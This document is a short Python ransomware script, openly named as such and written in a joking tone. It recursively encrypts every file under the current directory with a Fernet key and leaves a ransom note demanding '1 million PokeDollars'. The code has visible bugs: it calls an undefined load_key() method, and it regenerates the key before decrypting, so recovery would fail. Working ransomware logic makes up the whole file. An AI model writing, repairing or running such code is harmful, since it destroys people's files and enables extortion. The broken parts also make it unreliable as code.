# Must be run with the python3 command, i.e. python3 ransomware.py. 
from cryptography.fernet import Fernet
import os
import glob

print("Mwahaha we are encrypting all of your files! We're so EVIL!")

class Ransomware:

	def generate_encryption_key(self):
		key = Fernet.generate_key()
		with open("ransom.key", "wb") as keyf:
			keyf.write(key)
	def open_encryption_key(self):
		return open("ransom.key", "rb").read()

	def encrypt_file(self, key, directory):
		for x in os.walk(directory):
			for item in glob.glob(os.path.join(x[0], "*")):
				if os.path.isfile(item):
					evil_key = Fernet(key)
					file = open(item, "rb")
					encrypted_result = evil_key.encrypt(file.read())
					new_file = open(item, "wb")
					new_file.write(encrypted_result)

	def decrypt_file(self, key, directory):
		for x in os.walk(directory):
			for item in glob.glob(os.path.join(x[0], "*")):
				if os.path.isfile(item):
					evil_key = Fernet(key)
					file = open(item, "rb")
					decrypted_result = evil_key.decrypt(file.read())
					new_file = open(item, "wb")
					new_file.write(decrypted_result)

if __name__ == "__main__":
	
	# Change this if you want to decrypt. Don't decrypt if you haven't encrypted. 
	encrypt = True

	ransomware = Ransomware()
	ransomware.generate_encryption_key()

	if encrypt:
		ransomware.encrypt_file(ransomware.load_key(), os.getcwd())
		ransom_file = open("what_happened_to_my_files.txt", "a")
		ransom_file.write("What happened to my files?\n")
		ransom_file.write("We have hacked into your computer and encrypted them! If you want us to decrypt them, you must pay us 1 million PokeDollars!")
		ransom_file.close()
	else:
		ransomware.decrypt_file(ransomware.load_key(), os.getcwd())
